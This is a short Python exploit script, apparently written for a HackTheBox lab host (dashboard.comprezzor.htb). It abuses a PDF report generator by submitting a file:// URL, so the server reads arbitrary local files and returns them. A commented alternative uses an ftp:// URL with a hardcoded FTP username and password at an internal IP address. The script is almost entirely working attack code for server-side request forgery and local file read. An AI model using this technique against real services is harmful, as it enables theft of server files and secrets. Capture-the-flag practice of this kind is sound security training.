#!/usr/bin/python3
import requests, os, sys

cookie = ''

def create_pdf_report():
    cookies = {
        'user_data': cookie,
    }
    headers = {

    'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = f'report_url= file://{sys.argv[1]}'
    #data = f'report_url= ftp://ftp_admin:u3jai8y71s2@172.21.0.1/{sys.argv[1]}'
    r = requests.post('http://dashboard.comprezzor.htb/create_pdf_report', cookies=cookies, headers=headers, data=data, verify=False,)
    with open('report.pdf', 'wb') as f:
        f.write(r.content)

def print_pdf():
    print(os.popen('pdftotext report.pdf -').read().strip())
    os.system('rm report.pdf')

create_pdf_report()
print_pdf()
